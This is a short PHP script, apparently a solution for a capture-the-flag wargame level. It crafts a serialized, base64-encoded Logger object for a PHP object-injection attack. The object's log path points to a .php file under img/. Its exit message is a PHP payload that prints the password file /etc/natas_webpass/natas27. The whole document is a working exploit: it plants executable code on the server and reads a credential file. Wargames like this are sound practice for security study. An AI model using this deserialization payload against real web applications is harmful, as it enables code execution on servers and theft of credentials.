<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
  
    function __construct(){
        // initialise variables
        $this->initMsg="hello\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?>";
        $this->logFile = "img/baldysfile.php";
    }                   
}

$logger = new Logger();
$b64_encoded = base64_encode(serialize($logger));

print($b64_encoded);

?>
